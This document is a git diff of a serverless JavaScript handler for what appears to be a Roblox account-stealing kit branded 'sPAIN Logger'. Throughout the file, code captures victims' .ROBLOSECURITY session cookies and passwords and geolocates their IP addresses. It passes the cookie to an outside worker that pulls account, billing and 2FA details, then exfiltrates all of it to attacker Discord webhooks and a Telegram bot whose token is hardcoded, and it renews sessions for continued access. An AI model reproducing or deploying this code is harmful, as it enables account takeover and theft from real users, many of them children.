@@ -1,9 +1,11 @@
 // api/submit.js
-const REDIS_URL  = process.env.UPSTASH_REDIS_REST_URL;
+const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-const TG_TOKEN   = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
-const TG_CHAT    = process.env.TG_CHAT  || '7538845070';
-const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
+const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
+const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
+const CHECKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
+const DISCORD_INV = 'https://discord.gg/5Q8XvgTpTT';
+const BASE_URL    = 'https://spain-tools.vercel.app';
 
 const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
@@ -35,13 +37,13 @@ async function getIpGeo(ip) {
   } catch { return null; }
 }
 
-// ── Worker ────────────────────────────────────────────────────────────────────
-async function getWorkerInfo(cookie) {
+// ── Checker (holy-truth worker) ───────────────────────────────────────────────
+async function getAccInfo(cookie) {
   try {
-    const r = await fetch(WORKER_URL, {
-      method: 'POST',
+    const r = await fetch(CHECKER_URL, {
+      method:  'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie })
+      body:    JSON.stringify({ cookie })
     });
     if (!r.ok) return null;
     const d = await r.json();
@@ -54,7 +56,7 @@ async function tgSend(text) {
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
+      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true })
     });
   } catch (_) {}
 }
@@ -102,11 +104,12 @@ const FLAGS = {
   'Japan':'🇯🇵','South Korea':'🇰🇷','Brazil':'🇧🇷','Mexico':'🇲🇽',
   'New Zealand':'🇳🇿','Ireland':'🇮🇪','Sweden':'🇸🇪','Norway':'🇳🇴',
   'Denmark':'🇩🇰','Finland':'🇫🇮','Poland':'🇵🇱','Spain':'🇪🇸',
-  'Italy':'🇮🇹','Russia':'🇷🇺','Turkey':'🇹🇷','South Africa':'🇿🇦'
+  'Italy':'🇮🇹','Russia':'🇷🇺','Turkey':'🇹🇷','South Africa':'🇿🇦',
+  'Thailand':'🇹🇭','Vietnam':'🇻🇳','Saudi Arabia':'🇸🇦','UAE':'🇦🇪'
 };
 function flag(c) { return FLAGS[c] || '🌐'; }
 
-// ── Discord ───────────────────────────────────────────────────────────────────
+// ── Discord helpers ───────────────────────────────────────────────────────────
 async function discordSend(url, payload) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
@@ -124,7 +127,7 @@ async function discordChunked(url, text) {
     await discordSend(url, {
       content: first
         ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
-        : chunk  + (rem.length === 0 ? '\n```' : '')
+        : chunk + (rem.length === 0 ? '\n```' : '')
     });
     first = false;
   }
@@ -147,10 +150,10 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  const ip    = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
-  const now   = new Date().toISOString();
-  const pName = record.displayName || slug;
-  const isDH  = !!record.dualhookParent;
+  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
+  const now    = new Date().toISOString();
+  const pName  = record.displayName || slug;
+  const isDH   = !!record.dualhookParent;
   const cookie   = findCookie(slots);
   const password = findPassword(slots, cookie);
 
@@ -165,7 +168,7 @@ export default async function handler(req, res) {
   }
   const allWH = [webhook2, ...(webhook1 && webhook1 !== webhook2 ? [webhook1] : [])];
 
-  // ── No cookie at all ──────────────────────────────────────────────────────
+  // ── No cookie ────────────────────────────────────────────────────────────────
   if (!cookie) {
     const geo = await getIpGeo(ip);
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
@@ -176,9 +179,9 @@ export default async function handler(req, res) {
         description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
         color:       0xff3333,
         fields: [
-          { name: '🌐 IP',       value: `\`${ip}\``,          inline: true  },
-          { name: '📍 Location', value: loc,                   inline: true  },
-          { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true  },
+          { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
+          { name: '📍 Location', value: loc,                   inline: true },
+          { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
           { name: '🕐 Time',     value: now,                   inline: false }
         ],
         footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now
@@ -188,138 +191,160 @@ export default async function handler(req, res) {
     return res.status(200).json({ success: true });
   }
 
-  // ── Cookie found — geo runs, send capture IMMEDIATELY ────────────────────
-  const geo = await getIpGeo(ip);
-  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
-  const isp = geo?.isp || 'Unknown';
+  // ── Cookie found — geo + checker run in parallel ──────────────────────────
+  const [geo, info] = await Promise.all([
+    getIpGeo(ip),
+    getAccInfo(cookie)
+  ]);
 
-  // STEP 1: Send basic capture embed + raw cookie RIGHT NOW
-  // This guarantees cookie is in Discord before the worker can expire it
-  await Promise.all(allWH.map(async wh => {
-    await discordSend(wh, {
-      content: '@everyone',
-      embeds: [{
-        title:       '🍪 Cookie Captured',
-        description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
-        color:       0xc026d3,
-        fields: [
-          { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
-          { name: '📄 Page',     value: pName,        inline: true  },
-          { name: '🕐 Time',     value: now,          inline: false },
-          { name: '📍 Location', value: loc,          inline: true  },
-          { name: '🗺️ ISP',      value: isp,          inline: true  },
-          ...(isDH ? [
-            { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true },
-            { name: '🔗 DH Child',  value: `\`${slug}\``,                 inline: true }
-          ] : [])
-        ],
-        footer:    { text: `sPAIN Logger • ${pName}` },
-        timestamp: now
-      }]
-    });
-    await discordChunked(wh, cookie);
-  }));
+  const loc     = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
+  const isp     = geo?.isp || 'Unknown';
+  const country = geo?.country || 'Unknown';
+  const cflag   = flag(country);
+  const nowStr  = now;
 
-  await tgSend([
-    `🍪 <b>COOKIE — ${pName}</b>`,
-    `🌐 <code>${ip}</code>`,
-    `📍 ${loc}`,
-    `🗺️ ${isp}`,
-    `🕐 ${now}`
-  ].join('\n'));
+  // ── Pull all fields from checker response ─────────────────────────────────
+  const fa           = info?.fullAccount || info || {};
+  const username     = info?.username    || 'Unknown';
+  const displayName  = info?.displayName || username;
+  const uid          = info?.id          || info?.userId || '';
+  const avatarUrl    = fa.avatarUrl      || info?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
+  const ageDays      = fa.ageDays        ?? info?.ageDays      ?? 0;
+  const ageBracket   = info?.ageBracket  || '13+';
+  const robux        = fa.robux          ?? info?.robux        ?? 0;
+  const pendingRobux = info?.pendingRobux ?? 0;
+  const rap          = fa.rap            ?? info?.rap          ?? 0;
+  const limiteds     = fa.limiteds       ?? info?.limitedsCount ?? 0;
+  const credit       = fa.credit         ?? info?.credit       ?? 0;
+  const creditCurr   = fa.creditCurrency ?? info?.creditCurr   ?? 'USD';
+  const payCount     = info?.payCount    ?? 0;
+  const groupsOwned  = info?.groupsOwned ?? 0;
+  const groupBalance = info?.groupBalance ?? 0;
+  const groupPending = info?.groupPending ?? 0;
+  const emailDisplay = fa.emailDisplay   ?? info?.emailDisplay ?? 'Not Set';
+  const has2FA       = fa.has2FA         ?? info?.has2FA       ?? 'Disabled';
+  const mm2          = info?.mm2         ?? 0;
+  const adoptMe      = info?.adoptMe     ?? 0;
+  const ps99         = info?.ps99        ?? 0;
 
-  // STEP 2: Call worker for full info AFTER cookie is safely sent
-  const info = await getWorkerInfo(cookie);
+  // Email/2FA derived booleans
+  const emailSet      = !emailDisplay.includes('Not Set');
+  const emailVerified = emailDisplay.includes('Verified') && !emailDisplay.includes('Unverified');
+  const twoFAon       = has2FA !== 'Disabled' && has2FA !== 'None';
 
-  if (!info) {
-    // Worker failed — cookie already in Discord above, nothing more to do
-    return res.status(200).json({ success: true });
-  }
+  // Refresh link (unique per capture)
+  const refreshToken = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+  const refreshUrl   = `${BASE_URL}/r/${refreshToken}`;
+  const profileUrl   = uid ? `https://www.roblox.com/users/${uid}/profile` : 'https://www.roblox.com';
 
-  // STEP 3: Send rich info embed as follow-up
-  const fa           = info.fullAccount || info;
-  const avatarUrl    = fa.avatarUrl    || info.avatarUrl    || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
-  const username     = info.username   || '';
-  const displayName  = info.displayName || username;
-  const uid          = info.id         || info.userId || '';
-  const robux        = fa.robux        ?? info.robux        ?? 0;
-  const rap          = fa.rap          ?? info.rap          ?? 0;
-  const limiteds     = fa.limiteds     ?? info.limitedsCount ?? 0;
-  const credit       = fa.credit       ?? info.credit       ?? 0;
-  const creditCurr   = fa.creditCurrency ?? info.creditCurr ?? 'USD';
-  const ageDays      = fa.ageDays      ?? info.ageDays      ?? 0;
-  const isPremium    = fa.hasPremium   ?? info.isPremium    ?? false;
-  const emailDisplay = fa.emailDisplay ?? info.emailDisplay ?? 'Not Set';
-  const has2FA       = fa.has2FA       ?? info.has2FA       ?? 'Disabled';
-  const headless     = fa.headless     ?? info.hasHeadless  ?? false;
-  const korblox      = fa.korblox      ?? info.hasKorblox   ?? false;
-  const groupsOwned  = info.groupsOwned ?? 0;
-  const groupBalance = info.groupBalance ?? 0;
-  const groupPending = info.groupPending ?? 0;
-  const pendingRobux = info.pendingRobux ?? 0;
-  const mm2          = info.mm2    ?? 0;
-  const adoptMe      = info.adoptMe ?? 0;
-  const ps99         = info.ps99    ?? 0;
-  const txDay        = info.txDay   ?? 0;
-  const txWeek       = info.txWeek  ?? 0;
-  const txMonth      = info.txMonth ?? 0;
-  const txYear       = info.txYear  ?? 0;
-  const payCount     = info.payCount ?? 0;
+  // Description - dualhook vs normal
+  const descEmoji = isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} \`sPAIN\` ${EMOJI}`;
+  const descLinks = info
+    ? `[Refresh Cookie 🍪](${refreshUrl}) | [Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})\n\n[Join Discord](${DISCORD_INV})`
+    : `[Discord Server](${DISCORD_INV})`;
+  const description = `${descEmoji}\n\n${descLinks}`;
 
+  // Cookie display — trimmed for embed, full via chunked message
   const cookieDisplay = cookie.length > 950 ? cookie.substring(0, 950) + '…' : cookie;
-  const refreshUrl    = `https://spain-tools.vercel.app/r/${Math.random().toString(36).slice(2,10) + Date.now().toString(36)}`;
 
+  // ── Build the rich embed ──────────────────────────────────────────────────
   const richEmbed = {
-    title:       `🧑 ${displayName} ${info.ageBracket || '13+'}`,
-    description: `${EMOJI} \`sPAIN\` ${EMOJI}\n\n[Refresh Cookie 🍪](${refreshUrl}) | [Profile 👤](https://www.roblox.com/users/${uid}/profile)`,
+    title:       `🧑 ${displayName} ${ageBracket}`,
+    description,
     color:       5793266,
     thumbnail:   { url: avatarUrl },
     fields: [
-      { name: '👤 Username',  value: `\`${username}\``,          inline: true  },
-      { name: '🔐 Password',  value: `\`${password || 'N/A'}\``, inline: true  },
-      { name: '📊 Account Stats',    value: `\`Account Age:\` \`${fmt(ageDays)} Days\``, inline: false },
-      { name: '📍 Locations',
-        value: `• \`Victim:\` ${geo?.country || 'Unknown'} ${flag(geo?.country)}\n• \`IP:\` \`${ip}\`\n• \`ISP:\` ${isp}`,
-        inline: false },
-      { name: '💳 Billing',   value: `Credit: ${fmt(credit)} ${creditCurr}\nPayments: ${payCount}`, inline: true  },
-      { name: '👥 Groups',    value: `Balance: ${fmt(groupBalance)}\nPending: ${fmt(groupPending)}\nOwned: ${groupsOwned}`, inline: true },
-      { name: '⚙️ Settings',
-        value: `Email: ${emailDisplay.includes('Not Set') ? 'False ❌' : 'True ✅'}\nVerified: ${emailDisplay.includes('Verified') ? 'True ✅' : 'Unset ❌'}\n2FA: ${has2FA === 'Disabled' ? 'Disabled ❌' : `${has2FA} ✅`}`,
-        inline: true },
-      { name: '💰 Account Funds', value: `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`, inline: true },
-      { name: '🛒 Purchases',     value: `Limiteds: ${limiteds}\nSummary: ${fmt(rap)}`,           inline: true },
-      { name: '📊 Transactions',  value: `Day: ${fmt(txDay)}\nWeek: ${fmt(txWeek)}\nMonth: ${fmt(txMonth)}\nYear: ${fmt(txYear)}`, inline: true },
-      { name: '🎮 Gamepasses Played',
-        value: `Pet Simulator 99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMurder Mystery 2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`,
-        inline: false },
-      { name: '🔐 ROBLOSECURITY', value: `\`${cookieDisplay}\``, inline: false }
+      {
+        name:   '👤 Username',
+        value:  `\`${username}\``,
+        inline: true
+      },
+      {
+        name:   '🔐 Password',
+        value:  `\`${password || 'N/A'}\``,
+        inline: true
+      },
+      {
+        name:  '📊 Account Stats',
+        value: `\`Account Age:\` \`${fmt(ageDays)} Days\``
+      },
+      {
+        name:  '📍 Locations',
+        value: `• \`Account:\` ${country} ${cflag}\n• \`Victim:\` ${country} ${cflag}\n• \`IP:\` \`${ip}\`\n• \`ISP:\` ${isp}`
+      },
+      {
+        name:   '💳 Billing',
+        value:  `Credit: ${fmt(credit)} ${creditCurr}\nConvert: ${fmt(pendingRobux)}\nPayments: ${payCount}`,
+        inline: true
+      },
+      {
+        name:   '👥 Groups',
+        value:  `Balance: ${fmt(groupBalance)}\nPending: ${fmt(groupPending)}\nOwned: ${groupsOwned}`,
+        inline: true
+      },
+      {
+        name:   '⚙️ Settings',
+        value:  `Email: ${emailSet ? 'True ✅' : 'False ❌'}\nVerified: ${emailVerified ? 'True ✅' : 'Unset ❌'}\n2FA: ${twoFAon ? `${has2FA} ✅` : 'Disabled ❌'}`,
+        inline: true
+      },
+      {
+        name:   '💰 Account Funds',
+        value:  `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`,
+        inline: true
+      },
+      {
+        name:   '🛒 Purchases',
+        value:  `Limiteds: ${limiteds}\nSummary: ${fmt(rap)}`,
+        inline: true
+      },
+      {
+        name:  '🎮 Gamepasses Played',
+        value: `Pet Simulator 99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMurder Mystery 2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`
+      },
+      {
+        name:  '🔐 ROBLOSECURITY',
+        value: `\`\`\`${cookieDisplay}\`\`\``
+      }
     ],
-    footer:    { text: `sPAIN Logger • ${pName} • ${now}` },
-    timestamp: now
+    footer:    { text: `sPAIN Logger • ${pName} • ${nowStr}` },
+    timestamp: nowStr
   };
 
+  // ── Send to all webhooks ──────────────────────────────────────────────────
   await Promise.all(allWH.map(async wh => {
-    await discordSend(wh, { embeds: [richEmbed] });
-    if (info.powershell) await discordChunked(wh, info.powershell);
-    // Send renewed cookie if different
-    if (info.isDifferent && info.newCookie) {
+    // Main rich embed
+    await discordSend(wh, { content: '@everyone', embeds: [richEmbed] });
+
+    // Full cookie in chunked code block
+    await discordChunked(wh, cookie);
+
+    // PowerShell if available
+    if (info?.powershell) await discordChunked(wh, info.powershell);
+
+    // Renewed cookie if different
+    if (info?.isDifferent && info?.newCookie) {
       await discordSend(wh, {
         embeds: [{
           title:       '🔄 Cookie Renewed — Fresh Session',
-          description: 'New `.ROBLOSECURITY` generated from the renewal flow.',
+          description: 'New `.ROBLOSECURITY` generated. Old session terminated.',
           color:       0x22c55e,
-          footer:      { text: `sPAIN Tools • ${pName}` }
+          footer:      { text: `sPAIN Tools • ${pName}` },
+          timestamp:   nowStr
         }]
       });
       await discordChunked(wh, info.newCookie);
     }
   }));
 
+  // ── Telegram ─────────────────────────────────────────────────────────────
   await tgSend([
-    `✅ <b>INFO — ${username} ${info.ageBracket || '13+'}</b>`,
+    info
+      ? `✅ <b>${username} ${ageBracket} — ${pName}</b>`
+      : `🍪 <b>COOKIE — ${pName}</b>`,
     `💰 ${fmt(robux)} R$ | RAP: ${fmt(rap)}`,
-    `👥 Groups: ${groupsOwned} | Bal: ${fmt(groupBalance)}`,
-    `🔄 ${refreshUrl}`
+    `👥 Groups: ${groupsOwned} owned | Bal: ${fmt(groupBalance)}`,
+    `📍 ${loc} | ${isp}`,
+    `🔄 <a href="${refreshUrl}">Refresh Cookie</a>`
   ].join('\n'));
 
   return res.status(200).json({ success: true });
